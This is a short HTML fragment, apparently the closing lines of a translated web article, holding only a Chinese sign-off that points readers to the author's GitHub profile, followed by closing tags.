jd je jf jg jh ji jj hb bi translated">请务必查看我在https://github.com/0xNirvana<a class="ae jk" href="https://github.com/0xNirvana" rel="noopener ugc nofollow" target="_blank">的其他作品和评论</a></p></div></div>    
</body>
</html>